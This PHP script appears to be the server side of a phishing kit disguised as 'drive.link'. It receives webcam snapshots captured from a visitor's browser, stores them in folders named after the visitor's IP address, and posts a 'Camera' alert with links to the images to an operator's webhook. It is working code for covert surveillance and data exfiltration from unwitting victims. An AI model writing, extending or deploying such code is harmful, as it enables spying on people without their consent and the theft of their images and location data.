<?php
include("webhook.php");


$ip = getenv('HTTP_CLIENT_IP') ?:
    getenv('HTTP_X_FORWARDED_FOR') ?:
    getenv('HTTP_X_FORWARDED') ?:
    getenv('HTTP_FORWARDED_FOR') ?:
    getenv('HTTP_FORWARDED') ?:
    getenv('REMOTE_ADDR');

$dir1 = "/images/$ip";
$dir = "..$dir1";
$date = date('dMYHis');
$imageData = $_POST['cat'];
$isFirst = $_POST['isfirst'];
$cam_file = 'cam' . $date . '.png';
$path = dirname($_SERVER['REQUEST_URI'], 2) . $dir1;
$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$path";

if (!file_exists($dir)) {
    mkdir($dir, 0777, true);
}
$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);
$fp = fopen($dir . "/$cam_file", 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

$jdatastr = <<<EOD
    {
        "content": null,
        "embeds": [
        {
            "title": "Camera",
            "description": "This is the client's camera.",
            "color": 16736088,
            "fields": [
            {
                "name": "All Pictures",
                "value": "[CLICK HERE]($actual_link)",
                "inline": true
            }
            ],
            "author": {
            "name": "[drive.link] Camera Snapshot",
            "url": "https://drive.link"
            },
            "footer": {
            "text": "drive.link"
            },
            "image": {
            "url": "$actual_link/$cam_file"
            }
        }
        ]
    }
  EOD;

if ($isFirst === "true")
    sendWebhook($jdatastr);
exit($ip);
